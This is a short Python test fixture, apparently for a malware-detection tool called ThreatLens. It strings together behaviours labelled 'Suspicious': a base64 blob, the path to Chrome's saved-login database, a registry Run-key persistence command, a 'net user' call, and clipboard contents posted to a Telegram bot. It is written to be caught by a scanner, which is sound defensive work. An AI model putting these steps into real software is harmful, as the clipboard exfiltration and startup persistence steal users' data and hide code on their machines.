#!/usr/bin/env python3
"""This is a TEST FILE for ThreatLens analysis. NOT actual malware."""

import os
import subprocess
import base64
import urllib.request

# Suspicious: base64 encoded payload
payload = base64.b64decode("dGVzdCBwYXlsb2Fk")

# Suspicious: accessing browser data
chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")

# Suspicious: network activity
urllib.request.urlopen("http://example.com/data")

# Suspicious: system command execution
subprocess.run(["cmd", "/c", "net user"])

# Suspicious: registry manipulation
os.system("reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v test /d test.exe")

# Suspicious: clipboard access
import pyperclip
data = pyperclip.paste()

# Suspicious: sending to telegram bot
import requests
requests.post("https://api.telegram.org/bot123/sendMessage", data={"text": data})
